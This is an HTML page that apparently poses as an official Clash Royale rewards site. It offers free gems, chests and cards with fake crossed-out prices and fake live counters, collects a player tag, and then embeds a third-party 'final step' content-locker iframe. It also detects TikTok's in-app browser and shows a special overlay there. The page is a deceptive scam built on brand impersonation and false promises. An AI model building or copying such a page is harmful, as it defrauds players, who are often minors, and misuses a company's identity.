<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - Official Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-light-blue: #00d2ff;
            --cr-dark-blue: #0056b3;
            --cr-gold: #ffcc00;
            --cr-white: #ffffff;
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--cr-light-blue);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            overflow-x: hidden;
            background-image: radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%), radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%);
            background-position: 0 0, 25px 25px;
            background-size: 50px 50px;
            animation: moveBackground 4s linear infinite;
        }

        @keyframes moveBackground { from { background-position: 0 0, 25px 25px; } to { background-position: 50px 50px, 75px 75px; } }

        /* TIKTOK OVERLAY */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: cover; }

        .live-bar { background: rgba(0,0,0,0.7); padding: 8px 0; font-size: 13px; height: 20px; border-bottom: 2px solid var(--cr-gold); overflow: hidden; }
        #liveText { transition: transform 0.5s ease-in-out, opacity 0.5s; display: inline-block; width: 100%; }

        /* LOGO ANIMATION (FLOAT) */
        .logo-container { margin: 35px 0; }
        .logo { 
            width: 220px; 
            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
            animation: floatLogo 3s ease-in-out infinite;
        }
        @keyframes floatLogo {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .stats-panel {
            background: rgba(0, 50, 120, 0.85); border: 3px solid var(--cr-gold);
            border-radius: 25px; display: inline-flex; gap: 40px; padding: 20px 45px; margin-bottom: 30px;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.6); align-items: center;
        }
        .stat-box { display: flex; flex-direction: column; align-items: center; min-width: 100px; }
        .stat-val { font-size: 28px; text-shadow: 2px 2px #000; color: var(--cr-gold); }

        .container { width: 95%; max-width: 500px; margin: 0 auto; background: rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 25px 15px; }
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }

        .card {
            background: var(--cr-white); border: 2.5px solid var(--cr-gold); border-radius: 20px;
            padding: 15px 5px; position: relative; overflow: hidden;
            box-shadow: 0 6px 12px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center;
        }
        .item-name { font-size: 10px; color: #004a8d; z-index: 2; text-transform: uppercase; height: 26px; font-weight: bold; }
        .img-box { height: 75px; display: flex; align-items: center; justify-content: center; z-index: 2; margin: 5px 0; }
        .item-img { max-width: 90%; max-height: 100%; filter: drop-shadow(0 5px 8px rgba(0,0,0,0.2)); }
        
        /* PRICES STYLE */
        .price-line { font-size: 10px; margin-bottom: 8px; z-index: 2; display: flex; flex-direction: column; gap: 2px; }
        .old-price { color: #ff4444; text-decoration: line-through; opacity: 0.8; }
        .new-price { color: #28a745; font-weight: bold; font-size: 12px; }

        .btn-claim {
            background: linear-gradient(180deg, var(--cr-light-blue) 0%, var(--cr-dark-blue) 100%);
            border: none; border-bottom: 4px solid #003366; border-radius: 12px;
            color: white; font-size: 15px; padding: 8px 0; width: 92%; cursor: pointer; z-index: 2; font-family: 'Lilita One';
        }

        /* MODALS */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .modal-box { background: var(--cr-white); width: 85%; max-width: 400px; border: 5px solid var(--cr-gold); border-radius: 30px; padding: 20px 15px; color: #004a8d; text-align: center; position: relative; }
        .btn-back { position: absolute; top: 15px; left: 15px; background: none; border: none; font-size: 24px; color: #0056b3; cursor: pointer; z-index: 10; }

        .modal-input { background: #f0f0f0; border: 3px solid var(--cr-gold); border-radius: 18px; width: 90%; padding: 15px; font-family: 'Lilita One'; font-size: 22px; text-align: center; outline: none; margin: 15px 0; }
        .btn-continue { background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%); border: none; border-bottom: 6px solid #b36b00; border-radius: 15px; color: white; font-family: 'Lilita One'; font-size: 32px; padding: 12px 0; width: 100%; cursor: pointer; }

        /* FOOTER */
        footer { margin-top: 60px; background: #000; padding: 50px 20px; text-align: left; color: #ffffff; font-family: sans-serif; }
        .sc-logo-footer { width: 120px; margin-top: 20px; }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>

    <div class="live-bar">
        <div id="liveText">🔥 <b>Loading...</b></div>
    </div>

    <div class="logo-container">
        <img src="./clashro.PNG" class="logo">
    </div>

    <div class="stats-panel">
        <div class="stat-box">
            <div style="font-size: 10px;"><span style="color:#ff4444;">●</span> LIVE</div>
            <span class="stat-val" id="live_claimed">3,122</span>
        </div>
        <div class="stat-box">
            <div style="font-size: 10px;"><span style="color:#00ccff;">●</span> ONLINE</div>
            <span class="stat-val" id="live_online">1,088</span>
        </div>
    </div>

    <div class="container">
        <div style="font-size:20px; margin-bottom:20px; text-shadow: 2px 2px #000;">CHOOSE YOUR REWARD</div>
        <div class="grid" id="mainGrid"></div>
    </div>

    <!-- MODAL 1: PLAYER TAG -->
    <div class="modal-overlay" id="modalTag">
        <div class="modal-box">
            <button class="btn-back" onclick="closeModal('modalTag')"><i class="fas fa-arrow-left"></i></button>
            <h3 style="margin:20px 0 0 0; color: #0056b3;">YOU SELECTED:</h3>
            <img id="rewardDisplay" src="" style="width:100px; margin: 10px 0;">
            <h2 id="rewardNameDisplay" style="margin:5px 0; font-size: 18px;">REWARD</h2>
            <input type="text" class="modal-input" id="playerTag" placeholder="PLAYER TAG OR NAME" maxlength="15">
            <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
        </div>
    </div>

    <!-- MODAL 2: LOCKER -->
    <div class="modal-overlay" id="modalLocker">
        <div class="modal-box" style="max-width: 450px; padding: 10px;">
            <button class="btn-back" onclick="closeModal('modalLocker')"><i class="fas fa-arrow-left"></i></button>
            <h2 style="margin:25px 0 10px 0;">FINAL STEP</h2>
            <div style="background:#000; border-radius:20px; height:450px; overflow:hidden;">
                <iframe src="https://checkmyapp.store/cl/i/n66xj9" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <div style="max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between;">
            <div>
                <h4>Terms of Service</h4>
                <h4>Privacy Policy</h4>
            </div>
            <img src="./super.JPG" class="sc-logo-footer">
        </div>
    </footer>

    <script>
        const rewardsData = [
            {n: "10,000 GEMS", img: "gems5000.PNG", old: "$99.99"},
            {n: "LEGENDARY CHEST", img: "chest5stars.PNG", old: "$19.99"},
            {n: "EVO KNIGHT", img: "evoknight.PNG", old: "$24.99"},
            {n: "MAGIC ARCHER", img: "archer.PNG", old: "$14.99"},
            {n: "BALLOON", img: "Balloon.PNG", old: "$9.99"},
            {n: "KNIGHT", img: "Knight.PNG", old: "$4.99"},
            {n: "PRINCE", img: "prince.PNG", old: "$12.99"},
            {n: "WIZARD", img: "wizard.PNG", old: "$8.99"},
            {n: "MUSKETEER", img: "musketeer.PNG", old: "$7.99"},
            {n: "GIANT", img: "giant.PNG", old: "$9.99"},
            {n: "GOLEM", img: "golem.PNG", old: "$15.99"},
            {n: "MINI P.E.K.K.A", img: "minipekka.PNG", old: "$6.99"}
        ];

        const grid = document.getElementById('mainGrid');
        rewardsData.forEach((r, index) => {
            grid.innerHTML += `<div class="card">
                <div class="item-name">${r.n}</div>
                <div class="img-box"><img src="./${r.img}" class="item-img"></div>
                <div class="price-line">
                    <span class="old-price">${r.old}</span>
                    <span class="new-price">FREE</span>
                </div>
                <button class="btn-claim" onclick="openTagModal(${index})">CLAIM</button>
            </div>`;
        });

        function openTagModal(index) {
            const selected = rewardsData[index];
            document.getElementById('rewardDisplay').src = `./${selected.img}`;
            document.getElementById('rewardNameDisplay').innerText = selected.n;
            document.getElementById('modalTag').style.display = 'flex';
        }

        function closeModal(id) { document.getElementById(id).style.display = 'none'; }

        function goToLocker() {
            if(document.getElementById('playerTag').value.length > 2) {
                document.getElementById('modalTag').style.display = 'none';
                document.getElementById('modalLocker').style.display = 'flex';
            }
        }

        window.addEventListener("load", () => {
            if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
                document.getElementById("ttOverlay").style.display = "block";
            }
        });
    </script>
</body>
</html>
